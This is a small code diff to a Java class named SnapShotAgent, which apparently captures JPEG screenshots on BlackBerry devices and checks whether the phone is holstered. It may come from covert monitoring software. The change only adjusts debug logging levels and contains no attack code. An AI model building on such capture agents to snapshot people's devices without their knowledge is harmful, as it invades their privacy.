@@ -35,7 +35,7 @@ import blackberry.utils.WChar;
  */
 public final class SnapShotAgent extends Agent {
     //#ifdef DEBUG
-    static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("SnapShotAgent", DebugLevel.INFORMATION);
     //#endif
 
     private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 75;
@@ -80,8 +80,8 @@ public final class SnapShotAgent extends Agent {
      */
     public void actualRun() {
 
-        //#ifdef DEBUG_INFO
-        debug.info("Taking snapshot");
+        //#ifdef DEBUG_TRACE
+        debug.trace("Taking snapshot");
         //#endif
 
         if (DeviceInfo.isInHolster()) {
